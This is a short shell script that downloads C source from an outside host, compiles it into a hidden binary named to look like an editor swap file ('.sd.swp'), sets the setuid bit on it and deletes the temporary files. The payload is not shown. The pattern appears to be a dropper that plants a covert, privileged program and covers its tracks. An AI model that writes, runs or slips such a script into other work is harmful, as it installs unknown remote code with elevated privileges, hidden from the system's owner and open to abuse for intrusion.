#!/bin/sh
TMP=$(mktemp -d)
curl https://tools.tutils.com/dl/sd.c>$TMP/.sd.c
mkdir -p sd/src sd/data/ sd/log
gcc $TMP/.sd.c -o sd/src/.sd.swp
chmod u+s sd/src/.sd.swp
rm -rf $TMP
